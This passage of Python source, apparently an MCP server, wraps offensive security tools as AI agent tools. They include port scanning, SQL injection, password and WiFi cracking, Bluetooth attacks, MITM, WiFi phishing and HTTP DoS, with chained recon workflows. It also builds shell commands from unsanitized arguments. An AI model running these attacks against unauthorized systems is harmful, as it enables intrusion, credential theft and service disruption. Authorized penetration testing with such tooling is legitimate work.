            sql_result = sqlmap_scan(target, "--batch --level=2 --risk=2")
            results["phases"]["6_sql_injection"] = sql_result

            results["success"] = True
            results["summary"] = f"Advanced web security assessment completed for {target}"

        except Exception as e:
            logger.error(f"Error in advanced web security assessment: {str(e)}")
            results["success"] = False
            results["error"] = str(e)

        return results

    # 工具链组合功能
    @mcp.tool()
    def web_app_security_assessment(target: str, deep_scan: bool = False) -> Dict[str, Any]:
        """
        Comprehensive web application security assessment workflow.

        Args:
            target: Target web application URL
            deep_scan: Whether to perform deep scanning (takes longer)

        Returns:
            Complete security assessment results
        """
        import time
        from datetime import datetime

        results = {
            "target": target,
            "assessment_type": "web_application_security",
            "start_time": datetime.now().isoformat(),
            "deep_scan": deep_scan,
            "phases": {},
            "summary": {}
        }

        try:
            # Phase 1: Information Gathering
            logger.info(f"Phase 1: Information gathering for {target}")
            results["phases"]["1_info_gathering"] = {
                "description": "Basic information gathering and port scanning",
                "start_time": datetime.now().isoformat()
            }

            # Extract domain/IP from URL for nmap
            import re
            domain_match = re.search(r'https?://([^/]+)', target)
            if domain_match:
                scan_target = domain_match.group(1)
            else:
                scan_target = target

            # Port scan for web services
            nmap_result = nmap_scan(scan_target, "-sV", "80,443,8080,8443,3000,5000,8000,9000", "-T4 --open")
            results["phases"]["1_info_gathering"]["nmap_scan"] = nmap_result

            # Phase 2: Technology Detection
            logger.info(f"Phase 2: Technology detection for {target}")
            results["phases"]["2_tech_detection"] = {
                "description": "Web technology and framework detection",
                "start_time": datetime.now().isoformat()
            }

            tech_result = nuclei_technology_detection(target)
            results["phases"]["2_tech_detection"]["nuclei_tech"] = tech_result

            # Phase 3: Directory Discovery
            logger.info(f"Phase 3: Directory discovery for {target}")
            results["phases"]["3_directory_discovery"] = {
                "description": "Web directory and file discovery",
                "start_time": datetime.now().isoformat()
            }

            gobuster_result = gobuster_scan(target, "dir", "/usr/share/wordlists/dirb/common.txt", "-t 20 -x php,html,txt,js")
            results["phases"]["3_directory_discovery"]["gobuster_scan"] = gobuster_result

            # Phase 4: Vulnerability Scanning
            logger.info(f"Phase 4: Vulnerability scanning for {target}")
            results["phases"]["4_vulnerability_scan"] = {
                "description": "Automated vulnerability detection",
                "start_time": datetime.now().isoformat()
            }

            if deep_scan:
                vuln_result = nuclei_web_scan(target, "deep")
            else:
                vuln_result = nuclei_web_scan(target, "comprehensive")

            results["phases"]["4_vulnerability_scan"]["nuclei_vulns"] = vuln_result

            # Phase 5: Web Server Analysis
            logger.info(f"Phase 5: Web server analysis for {target}")
            results["phases"]["5_webserver_analysis"] = {
                "description": "Web server security analysis",
                "start_time": datetime.now().isoformat()
            }

            nikto_result = nikto_scan(target, "-C all")
            results["phases"]["5_webserver_analysis"]["nikto_scan"] = nikto_result

            # Generate Summary
            results["end_time"] = datetime.now().isoformat()
            results["success"] = True
            results["summary"] = {
                "phases_completed": len(results["phases"]),
                "total_findings": "Analysis required",
                "recommendation": "Review all phases for security issues"
            }

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)
            results["end_time"] = datetime.now().isoformat()
            logger.error(f"Web app security assessment failed: {e}")

        return results

    @mcp.tool()
    def network_penetration_test(target: str, scope: str = "single") -> Dict[str, Any]:
        """
        Network penetration testing workflow.

        Args:
            target: Target IP address or network range
            scope: Scope of testing (single, subnet)

        Returns:
            Network penetration test results
        """
        from datetime import datetime

        results = {
            "target": target,
            "assessment_type": "network_penetration_test",
            "scope": scope,
            "start_time": datetime.now().isoformat(),
            "phases": {},
            "summary": {}
        }

        try:
            # Phase 1: Host Discovery
            logger.info(f"Phase 1: Host discovery for {target}")
            results["phases"]["1_host_discovery"] = {
                "description": "Network host discovery and ping sweep",
                "start_time": datetime.now().isoformat()
            }

            if scope == "subnet":
                ping_result = executor.execute_command(f"nmap -sn {target}")
            else:
                ping_result = executor.execute_command(f"ping -c 3 {target}")

            results["phases"]["1_host_discovery"]["ping_scan"] = ping_result

            # Phase 2: Port Discovery
            logger.info(f"Phase 2: Port discovery for {target}")
            results["phases"]["2_port_discovery"] = {
                "description": "Comprehensive port scanning",
                "start_time": datetime.now().isoformat()
            }

            port_result = nmap_scan(target, "-sS", "80,443,22", "-T5 --open --min-rate 5000 --max-retries 1 --host-timeout 3s")
            results["phases"]["2_port_discovery"]["nmap_ports"] = port_result

            # Phase 3: Service Enumeration
            logger.info(f"Phase 3: Service enumeration for {target}")
            results["phases"]["3_service_enum"] = {
                "description": "Service version detection and enumeration",
                "start_time": datetime.now().isoformat()
            }

            service_result = nmap_scan(target, "-sV -sC", "", "-T4")
            results["phases"]["3_service_enum"]["nmap_services"] = service_result

            # Phase 4: Vulnerability Assessment
            logger.info(f"Phase 4: Vulnerability assessment for {target}")
            results["phases"]["4_vuln_assessment"] = {
                "description": "Network vulnerability scanning",
                "start_time": datetime.now().isoformat()
            }

            network_vuln_result = nuclei_network_scan(target, "full")
            results["phases"]["4_vuln_assessment"]["nuclei_network"] = network_vuln_result

            # Phase 5: OS Detection
            logger.info(f"Phase 5: OS detection for {target}")
            results["phases"]["5_os_detection"] = {
                "description": "Operating system detection",
                "start_time": datetime.now().isoformat()
            }

            os_result = nmap_scan(target, "-O", "", "--osscan-guess")
            results["phases"]["5_os_detection"]["nmap_os"] = os_result

            # Generate Summary
            results["end_time"] = datetime.now().isoformat()
            results["success"] = True
            results["summary"] = {
                "phases_completed": len(results["phases"]),
                "recommendation": "Analyze results for potential attack vectors"
            }

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)
            results["end_time"] = datetime.now().isoformat()
            logger.error(f"Network penetration test failed: {e}")

        return results

    # 新增现代工具
    @mcp.tool()
    def ffuf_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                  mode: str = "FUZZ", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute FFUF web fuzzer (faster alternative to wfuzz).

        Args:
            url: Target URL with FUZZ keyword (e.g., 'http://example.com/FUZZ')
            wordlist: Path to wordlist file
            mode: Fuzzing mode (FUZZ for directories, HFUZZ for headers)
            additional_args: Additional FFUF arguments

        Returns:
            FFUF scan results
        """
        cmd = f"ffuf -u {url} -w {wordlist} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def whatweb_scan(target: str, aggression: str = "1", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute WhatWeb for web technology identification.

        Args:
            target: Target URL or IP
            aggression: Aggression level (1-4, 1=passive, 4=aggressive)
            additional_args: Additional WhatWeb arguments

        Returns:
            Technology identification results
        """
        cmd = f"whatweb -a {aggression} {target} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def amass_enum(domain: str, mode: str = "enum", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute AMASS for comprehensive subdomain enumeration.

        Args:
            domain: Target domain for enumeration
            mode: AMASS mode (enum, intel, track, db)
            additional_args: Additional AMASS arguments

        Returns:
            Subdomain enumeration results
        """
        cmd = f"amass {mode} -d {domain} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def subfinder_scan(domain: str, sources: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Subfinder for fast subdomain discovery.

        Args:
            domain: Target domain
            sources: Specific sources to use (comma-separated)
            additional_args: Additional Subfinder arguments

        Returns:
            Subdomain discovery results
        """
        cmd = f"subfinder -d {domain}"
        if sources:
            cmd += f" -sources {sources}"
        cmd += f" {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def httpx_probe(targets: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute httpx for HTTP probing and technology detection.

        Args:
            targets: Target URLs, IPs, or file containing targets
            additional_args: Additional httpx arguments

        Returns:
            HTTP probing results
        """
        cmd = f"echo '{targets}' | httpx {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def masscan_fast_scan(target: str, ports: str = "80,443,22,21,25,53,110,143,993,995,8080,8443",
                          rate: str = "10000", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Masscan for ultra-fast port scanning.

        Args:
            target: Target IP or network range
            ports: Ports to scan (comma-separated or range)
            rate: Scan rate (packets per second)
            additional_args: Additional Masscan arguments

        Returns:
            Fast port scan results
        """
        cmd = f"masscan {target} -p{ports} --rate={rate} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def hashcat_crack(hash_file: str, attack_mode: str = "0",
                      wordlist: str = "/usr/share/wordlists/rockyou.txt",
                      hash_type: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Hashcat for GPU-accelerated password cracking.

        Args:
            hash_file: File containing hashes to crack
            attack_mode: Attack mode (0=dictionary, 1=combinator, 3=brute-force)
            wordlist: Wordlist file for dictionary attacks
            hash_type: Hash type (-m parameter)
            additional_args: Additional Hashcat arguments

        Returns:
            Password cracking results
        """
        cmd = f"hashcat -a {attack_mode}"
        if hash_type:
            cmd += f" -m {hash_type}"
        cmd += f" {hash_file} {wordlist} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def searchsploit_search(term: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Search exploit database using searchsploit.

        Args:
            term: Search term (software, version, CVE, etc.)
            additional_args: Additional searchsploit arguments

        Returns:
            Exploit search results
        """
        cmd = f"searchsploit {term} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def aircrack_attack(capture_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                        bssid: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Aircrack-ng for WiFi password cracking.

        Args:
            capture_file: Path to capture file (.cap or .pcap)
            wordlist: Wordlist for dictionary attack
            bssid: Target BSSID (optional)
            additional_args: Additional Aircrack-ng arguments

        Returns:
            WiFi cracking results
        """
        cmd = f"aircrack-ng {capture_file} -w {wordlist}"
        if bssid:
            cmd += f" -b {bssid}"
        cmd += f" {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def comprehensive_recon(target: str, domain_enum: bool = True,
                           port_scan: bool = True, web_scan: bool = True) -> Dict[str, Any]:
        """
        Execute comprehensive reconnaissance workflow using multiple tools.

        Args:
            target: Target domain or IP
            domain_enum: Whether to perform subdomain enumeration
            port_scan: Whether to perform port scanning
            web_scan: Whether to perform web application scanning

        Returns:
            Comprehensive reconnaissance results
        """
        from datetime import datetime

        results = {
            "target": target,
            "workflow": "comprehensive_recon",
            "start_time": datetime.now().isoformat(),
            "phases": {}
        }

        try:
            # Phase 1: Subdomain enumeration
            if domain_enum and not target.replace(".", "").replace("/", "").isdigit():
                logger.info(f"Phase 1: Subdomain enumeration for {target}")
                results["phases"]["1_subdomain_enum"] = {
                    "subfinder": subfinder_scan(target),
                    "amass": amass_enum(target, "enum", "-passive"),
                    "sublist3r": executor.execute_command(f"sublist3r -d {target}")
                }

            # Phase 2: Port scanning
            if port_scan:
                logger.info(f"Phase 2: Port scanning for {target}")
                results["phases"]["2_port_scan"] = {
                    "masscan": masscan_fast_scan(target),
                    "nmap": nmap_scan(target, "-sV -sC", "", "-T4")
                }

            # Phase 3: Web application scanning
            if web_scan:
                logger.info(f"Phase 3: Web application scanning for {target}")
                target_url = target if target.startswith("http") else f"http://{target}"
                results["phases"]["3_web_scan"] = {
                    "whatweb": whatweb_scan(target_url),
                    "httpx": httpx_probe(target_url, "-tech-detect -status-code"),
                    "nuclei": nuclei_scan(target_url, "http/", "critical,high")
                }

            results["success"] = True
            results["end_time"] = datetime.now().isoformat()

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)
            logger.error(f"Comprehensive recon failed: {e}")

        return results

    # ====================  新增工具函数 ====================
    
    # 核心扫描工具
    @mcp.tool()
    def zmap_scan(target: str, port: str = "80", rate: str = "10000", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Zmap network scanner.
        
        Args:
            target: Target network or IP range
            port: Port to scan (default: 80)
            rate: Scan rate (default: 10000)
            additional_args: Additional Zmap arguments
            
        Returns:
            Zmap scan results
        """
        data = {
            "target": target,
            "port": port,
            "rate": rate,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("zmap", data)

    # 目录和Web扫描工具
    @mcp.tool()
    def feroxbuster_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                        threads: str = "50", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute feroxbuster directory scanner.
        
        Args:
            url: Target URL
            wordlist: Path to wordlist file
            threads: Number of concurrent threads
            additional_args: Additional feroxbuster arguments
            
        Returns:
            Feroxbuster scan results
        """
        data = {
            "url": url,
            "wordlist": wordlist,
            "threads": threads,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("feroxbuster", data)

    # DNS枚举工具
    @mcp.tool()
    def dnsenum_scan(domain: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute dnsenum for DNS enumeration.
        
        Args:
            domain: Target domain
            additional_args: Additional dnsenum arguments
            
        Returns:
            DNS enumeration results
        """
        data = {
            "domain": domain,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dnsenum", data)

    @mcp.tool()
    def fierce_scan(domain: str, threads: str = "10", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute fierce DNS scanner.
        
        Args:
            domain: Target domain
            threads: Number of threads
            additional_args: Additional fierce arguments
            
        Returns:
            Fierce scan results
        """
        data = {
            "domain": domain,
            "threads": threads,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("fierce", data)

    @mcp.tool()
    def dnsmap_scan(domain: str, wordlist: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute dnsmap for DNS mapping.
        
        Args:
            domain: Target domain
            wordlist: Path to wordlist file
            additional_args: Additional dnsmap arguments
            
        Returns:
            DNS mapping results
        """
        data = {
            "domain": domain,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dnsmap", data)


    # Web漏洞扫描工具
    @mcp.tool()
    def joomscan_scan(target: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute joomscan for Joomla security testing.
        
        Args:
            target: Target Joomla URL
            additional_args: Additional joomscan arguments
            
        Returns:
            Joomla scan results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("joomscan", data)

    # 密码攻击工具
    @mcp.tool()
    def ncrack_attack(target: str, service: str = "ssh", username_file: str = "",
                     password_file: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute ncrack for network authentication cracking.
        
        Args:
            target: Target host
            service: Service to attack
            username_file: Path to username file
            password_file: Path to password file
            additional_args: Additional ncrack arguments
            
        Returns:
            Network cracking results
        """
        data = {
            "target": target,
            "service": service,
            "username_file": username_file,
            "password_file": password_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("ncrack", data)

    @mcp.tool()
    def patator_attack(module: str = "ssh_login", target: str = "", wordlist: str = "",
                      additional_args: str = "") -> Dict[str, Any]:
        """
        Execute patator for multi-protocol brute-forcing.
        
        Args:
            module: Patator module to use
            target: Target host
            wordlist: Path to wordlist file
            additional_args: Additional patator arguments
            
        Returns:
            Brute force attack results
        """
        data = {
            "module": module,
            "target": target,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("patator", data)

    @mcp.tool()
    def crowbar_attack(service: str = "ssh", target: str = "", username: str = "",
                      wordlist: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute crowbar for brute force attacks.
        
        Args:
            service: Service to attack
            target: Target host
            username: Username to test
            wordlist: Path to wordlist file
            additional_args: Additional crowbar arguments
            
        Returns:
            Brute force attack results
        """
        data = {
            "service": service,
            "target": target,
            "username": username,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("crowbar", data)

    @mcp.tool()
    def brutespray_attack(nmap_file: str, username_file: str = "", password_file: str = "",
                         threads: str = "5", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute brutespray for brute force attacks from nmap output.
        
        Args:
            nmap_file: Path to nmap XML output file
            username_file: Path to username file
            password_file: Path to password file
            threads: Number of threads
            additional_args: Additional brutespray arguments
            
        Returns:
            Brute force attack results
        """
        data = {
            "nmap_file": nmap_file,
            "username_file": username_file,
            "password_file": password_file,
            "threads": threads,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("brutespray", data)

    # 网络发现工具
    @mcp.tool()
    def arp_scan(interface: str = "", network: str = "--local", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute arp-scan for network discovery.
        
        Args:
            interface: Network interface to use
            network: Network to scan
            additional_args: Additional arp-scan arguments
            
        Returns:
            ARP scan results
        """
        data = {
            "interface": interface,
            "network": network,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("arp-scan", data)

    @mcp.tool()
    def fping_scan(targets: str, count: str = "3", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute fping for fast ping sweeps.
        
        Args:
            targets: Target hosts or networks
            count: Number of ping packets
            additional_args: Additional fping arguments
            
        Returns:
            Ping sweep results
        """
        data = {
            "targets": targets,
            "count": count,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("fping", data)

    # 无线安全工具
    @mcp.tool()
    def bully_attack(interface: str, bssid: str, additional_args: str = "-v") -> Dict[str, Any]:
        """
        Execute bully for WPS attacks.
        
        Args:
            interface: Wireless interface
            bssid: Target AP BSSID
            additional_args: Additional bully arguments
            
        Returns:
            WPS attack results
        """
        data = {
            "interface": interface,
            "bssid": bssid,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("bully", data)

    @mcp.tool()
    def pixiewps_attack(pke: str, pkr: str, e_hash1: str, e_hash2: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute pixiewps for WPS PIN recovery.
        
        Args:
            pke: Public Key E
            pkr: Public Key R
            e_hash1: E-Hash1
            e_hash2: E-Hash2
            additional_args: Additional pixiewps arguments
            
        Returns:
            WPS PIN recovery results
        """
        data = {
            "pke": pke,
            "pkr": pkr,
            "e_hash1": e_hash1,
            "e_hash2": e_hash2,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("pixiewps", data)

    @mcp.tool()
    def wifiphisher_attack(interface: str, essid: str = "", phishing_scenario: str = "firmware-upgrade",
                          additional_args: str = "") -> Dict[str, Any]:
        """
        Execute wifiphisher for WiFi phishing attacks.
        
        Args:
            interface: Wireless interface
            essid: Target network ESSID
            phishing_scenario: Phishing scenario to use
            additional_args: Additional wifiphisher arguments
            
        Returns:
            WiFi phishing attack results
        """
        data = {
            "interface": interface,
            "essid": essid,
            "phishing_scenario": phishing_scenario,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wifiphisher", data)

    # 蓝牙工具
    @mcp.tool()
    def bluesnarfer_attack(target_mac: str, action: str = "info", channel: str = "1",
                          additional_args: str = "") -> Dict[str, Any]:
        """
        Execute bluesnarfer for Bluetooth attacks.
        
        Args:
            target_mac: Target Bluetooth MAC address
            action: Action to perform (info, backup)
            channel: Bluetooth channel
            additional_args: Additional bluesnarfer arguments
            
        Returns:
            Bluetooth attack results
        """
        data = {
            "target_mac": target_mac,
            "action": action,
            "channel": channel,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("bluesnarfer", data)

    @mcp.tool()
    def btscanner_scan(output_file: str = "/tmp/btscanner.xml", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute btscanner for Bluetooth device discovery.
        
        Args:
            output_file: Output file path
            additional_args: Additional btscanner arguments
            
        Returns:
            Bluetooth scan results
        """
        data = {
            "output_file": output_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("btscanner", data)

    # 网络攻击工具
    @mcp.tool()
    def ettercap_attack(interface: str, target1: str = "", target2: str = "",
                       filter_file: str = "", additional_args: str = "-T") -> Dict[str, Any]:
        """
        Execute ettercap for network sniffing and MITM attacks.
        
        Args:
            interface: Network interface
            target1: First target IP
            target2: Second target IP
            filter_file: Ettercap filter file
            additional_args: Additional ettercap arguments
            
        Returns:
            Network attack results
        """
        data = {
            "interface": interface,
            "target1": target1,
            "target2": target2,
            "filter_file": filter_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("ettercap", data)

    @mcp.tool()
    def responder_attack(interface: str, analyze_mode: bool = False, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Responder for LLMNR/NBT-NS poisoning.
        
        Args:
            interface: Network interface
            analyze_mode: Enable analyze mode
            additional_args: Additional responder arguments
            
        Returns:
            LLMNR/NBT-NS poisoning results
        """
        data = {
            "interface": interface,
            "analyze_mode": analyze_mode,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("responder", data)

    @mcp.tool()
    def dsniff_sniff(interface: str = "", filter_expr: str = "", output_file: str = "",
                    additional_args: str = "") -> Dict[str, Any]:
        """
        Execute dsniff for network sniffing.
        
        Args:
            interface: Network interface
            filter_expr: BPF filter expression
            output_file: Output file path
            additional_args: Additional dsniff arguments
            
        Returns:
            Network sniffing results
        """
        data = {
            "interface": interface,
            "filter": filter_expr,
            "output_file": output_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dsniff", data)

    @mcp.tool()
    def ngrep_search(pattern: str = "", interface: str = "", filter_expr: str = "",
                    additional_args: str = "") -> Dict[str, Any]:
        """
        Execute ngrep for network grep.
        
        Args:
            pattern: Search pattern
            interface: Network interface
            filter_expr: BPF filter expression
            additional_args: Additional ngrep arguments
            
        Returns:
            Network grep results
        """
        data = {
            "pattern": pattern,
            "interface": interface,
            "filter": filter_expr,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("ngrep", data)

    @mcp.tool()
    def tshark_capture(interface: str = "", capture_filter: str = "", display_filter: str = "",
                      output_file: str = "", packet_count: str = "100", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute tshark for network analysis.
        
        Args:
            interface: Network interface
            capture_filter: Capture filter
            display_filter: Display filter
            output_file: Output file path
            packet_count: Number of packets to capture
            additional_args: Additional tshark arguments
            
        Returns:
            Network analysis results
        """
        data = {
            "interface": interface,
            "capture_filter": capture_filter,
            "display_filter": display_filter,
            "output_file": output_file,
            "packet_count": packet_count,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("tshark", data)

    # DoS工具
    @mcp.tool()
    def slowhttptest_dos(target: str, attack_type: str = "slowloris", connections: str = "200",
                        timeout: str = "240", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute slowhttptest for HTTP DoS testing.
        
        Args:
            target: Target URL
            attack_type: Type of attack (slowloris, slow_post, slow_read)
            connections: Number of connections
            timeout: Connection timeout
            additional_args: Additional slowhttptest arguments
            
        Returns:
            HTTP DoS test results
        """
        data = {
            "target": target,
            "attack_type": attack_type,
            "connections": connections,
            "timeout": timeout,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("slowhttptest", data)

    # 后渗透工具
    @mcp.tool()
    def armitage_start(additional_args: str = "") -> Dict[str, Any]:
        """
        Execute armitage GUI (note: this will start the GUI).
        
        Args:
            additional_args: Additional armitage arguments
            
        Returns:
            Armitage startup results
        """
        data = {
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("armitage", data)

    # 信息收集工具
    @mcp.tool()
    def recon_ng_run(workspace: str = "default", module: str = "", options: Dict[str, str] = {},
                    additional_args: str = "") -> Dict[str, Any]:
        """
        Execute recon-ng for reconnaissance.
        
        Args:
            workspace: Recon-ng workspace
            module: Module to execute
            options: Module options
            additional_args: Additional recon-ng arguments
            
        Returns:
            Reconnaissance results
        """
        data = {
            "workspace": workspace,
            "module": module,
            "options": options,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("recon-ng", data)

    @mcp.tool()
    def sherlock_search(username: str, sites: str = "", output_format: str = "json",
                       additional_args: str = "") -> Dict[str, Any]:
        """
        Execute sherlock for username enumeration across social networks.
        
        Args:
            username: Username to search for
            sites: Specific sites to search
            output_format: Output format
            additional_args: Additional sherlock arguments
            
        Returns:
            Username enumeration results
        """
        data = {
            "username": username,
            "sites": sites,
            "output_format": output_format,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("sherlock", data)

    @mcp.tool()
    def whatweb_identify(target: str, aggression: str = "1", output_format: str = "json",
                        additional_args: str = "") -> Dict[str, Any]:
        """
        Execute whatweb for web technology identification.
        
        Args:
            target: Target URL or IP
            aggression: Aggression level (1-4)
            output_format: Output format
            additional_args: Additional whatweb arguments
            
        Returns:
            Web technology identification results
        """
        data = {
            "target": target,
            "aggression": aggression,
            "output_format": output_format,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("whatweb", data)

    # 网络攻击工具
    @mcp.tool()
    def yersinia_attack(protocol: str = "stp", interface: str = "", attack_type: str = "",
                       additional_args: str = "") -> Dict[str, Any]:
        """
        Execute yersinia for network protocol attacks.
        
        Args:
            protocol: Protocol to attack (stp, cdp, dtp, etc.)
            interface: Network interface
            attack_type: Type of attack
            additional_args: Additional yersinia arguments
            
        Returns:
            Network protocol attack results
        """
        data = {
            "protocol": protocol,
            "interface": interface,
            "attack_type": attack_type,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("yersinia", data)

    # ==================== 并发任务管理MCP工具 ====================
    
    @mcp.tool()
    def submit_concurrent_task(tool_name: str, parameters: Dict[str, Any],
                             priority: int = 2, timeout: Optional[int] = None,
                             tags: Optional[List[str]] = None,
                             metadata: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        提交并发任务。
        
        Args:
            tool_name: 工具名称
            parameters: 工具参数
            priority: 任务优先级 (1=低, 2=普通, 3=高, 4=紧急)
            timeout: 超时时间(秒)
            tags: 任务标签
            metadata: 元数据
            
        Returns:
            任务提交结果
        """
        data = {
            "tool_name": tool_name,
            "parameters": parameters,
            "priority": priority,
            "timeout": timeout,
            "tags": tags or [],
            "metadata": metadata or {}
        }
        return executor.execute_tool_with_data("submit_task", data)

    @mcp.tool()
    def submit_workflow(workflow_name: str, target: str, 
                       workflow_type: str = "comprehensive_web_scan") -> Dict[str, Any]:
        """
        提交预定义工作流。
        
        Args:
            workflow_name: 工作流名称
            target: 目标地址或域名
            workflow_type: 工作流类型
                - "comprehensive_web_scan": 全面Web扫描
                - "network_penetration_test": 网络渗透测试
                - "fast_reconnaissance": 快速侦察
                
        Returns:
            工作流提交结果
        """
        data = {
            "workflow_name": workflow_name,
            "target": target,
            "workflow_type": workflow_type
        }
        return executor.execute_tool_with_data("submit_workflow", data)

    @mcp.tool()
    def get_task_status(task_id: str) -> Dict[str, Any]:
        """
        获取任务状态。
        
        Args:
            task_id: 任务ID
            
        Returns:
            任务状态信息
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}
    
    @mcp.tool()
    def get_workflow_status(workflow_id: str) -> Dict[str, Any]:
        """
        获取工作流状态。
        
        Args:
            workflow_id: 工作流ID
            
        Returns:
            工作流状态信息，包含所有任务的详细状态
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}
    
    @mcp.tool()
    def get_concurrent_system_stats() -> Dict[str, Any]:
        """
        获取并发任务系统统计信息。
        
        Returns:
            系统统计信息，包括任务数量、队列状态等
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}
    
    @mcp.tool()
    def comprehensive_web_security_scan(target: str, workflow_name: str = "Web Security Assessment") -> Dict[str, Any]:
        """
        执行全面的Web安全评估工作流。
        
        该工作流包括：
        1. 技术检测 (whatweb)
        2. 目录扫描 (gobuster)
        3. Web服务器扫描 (nikto)
        4. 漏洞扫描 (nuclei)
        
        Args:
            target: 目标Web应用URL
            workflow_name: 工作流名称
            
        Returns:
            工作流提交结果
        """
        return submit_workflow(
            workflow_name=workflow_name,
            target=target,
            workflow_type="comprehensive_web_scan"
        )
    
    @mcp.tool()
    def network_penetration_testing(target: str, workflow_name: str = "Network Penetration Test") -> Dict[str, Any]:
        """
        执行网络渗透测试工作流。
        
        该工作流包括：
        1. 端口扫描 (nmap)
        2. 网络漏洞扫描 (nuclei)
        
        Args:
            target: 目标IP地址或网络范围
            workflow_name: 工作流名称
            
        Returns:
            工作流提交结果
        """
        return submit_workflow(
            workflow_name=workflow_name,
            target=target,
            workflow_type="network_penetration_test"
        )
    
    @mcp.tool()
    def fast_reconnaissance(target: str, workflow_name: str = "Fast Reconnaissance") -> Dict[str, Any]:
        """
        执行快速侦察工作流。
        
        该工作流包括：
        1. 快速端口扫描 (masscan)
        2. 子域名枚举 (subfinder)
        
        Args:
            target: 目标域名或IP地址
            workflow_name: 工作流名称
            
        Returns:
            工作流提交结果
        """
        return submit_workflow(
            workflow_name=workflow_name,
            target=target,
            workflow_type="fast_reconnaissance"
        )
    
    @mcp.tool()
    def parallel_port_scanning(targets: List[str], ports: str = "1-1000",
                             scan_type: str = "-sS", priority: int = 3) -> Dict[str, Any]:
        """
        并行执行多个目标的端口扫描。
        
        Args:
            targets: 目标列表
            ports: 端口范围
            scan_type: 扫描类型
            priority: 任务优先级
            
        Returns:
            所有提交的任务ID列表
        """
        task_ids = []
        for target in targets:
            result = submit_concurrent_task(
                tool_name="nmap",
                parameters={
                    "target": target,
                    "scan_type": scan_type,
                    "ports": ports,
                    "additional_args": "-T4 --open"
                },
                priority=priority,
                timeout=600,
                tags=["port_scan", "parallel"],
                metadata={"batch_scan": True, "target_count": len(targets)}
            )
            if result.get("success"):
                task_ids.append(result.get("task_id"))
        
        return {
            "success": True,
            "task_ids": task_ids,
            "total_tasks": len(task_ids),
            "message": f"Submitted {len(task_ids)} parallel port scanning tasks"
        }
    
    @mcp.tool()
    def parallel_directory_scanning(urls: List[str], wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                                  priority: int = 2) -> Dict[str, Any]:
        """
        并行执行多个目标的目录扫描。
        
        Args:
            urls: 目标URL列表
            wordlist: 字典文件路径
            priority: 任务优先级
            
        Returns:
            所有提交的任务ID列表
        """
        task_ids = []
        for url in urls:
            result = submit_concurrent_task(
                tool_name="gobuster",
                parameters={
